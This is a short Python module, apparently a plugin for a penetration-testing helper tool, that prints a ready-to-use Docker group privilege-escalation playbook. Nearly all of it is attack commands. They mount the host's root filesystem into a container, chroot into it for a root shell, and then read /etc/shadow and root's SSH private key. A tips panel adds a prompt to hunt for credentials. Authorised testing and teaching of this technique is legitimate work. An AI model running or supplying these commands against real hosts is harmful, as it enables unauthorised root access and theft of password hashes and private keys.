from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()


def run(data, cred, args):

    console.print(
        Panel.fit(
            "[bold cyan]Docker Group Privilege Escalation[/bold cyan]\n\n"
            "[white]Condition:[/white] Current user is a member of the docker group.",
            border_style="cyan",
        )
    )

    commands = """# ==========================================
# Enumeration
# ==========================================

# Confirm group membership
id

# Running containers
docker ps

# Available images
docker image ls


# ==========================================
# Privilege Escalation
# ==========================================

# Replace 'image' with an available image
docker run -v /:/mnt --rm -it image chroot /mnt bash
# or
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it image chroot /mnt bash

# ==========================================
# Host Enumeration
# ==========================================

cd /mnt

cat /mnt/etc/shadow

cat /mnt/root/.ssh/id_rsa

ls -la /mnt/home
"""

    console.print(
        Syntax(
            commands,
            "bash",
            theme="monokai",
            line_numbers=False,
        )
    )

    console.print(
        Panel.fit(
            """[bold yellow]Notes[/bold yellow]

• Confirm the current user belongs to the docker group.
• Enumerate available images before exploitation.
• Replace 'image' with any image returned by 'docker image ls'.
• The host filesystem will be mounted under /mnt.
• Check /mnt/root/.ssh, /mnt/home, and other sensitive locations for credentials.""",
            title="Tips",
            border_style="yellow",
        )
    )
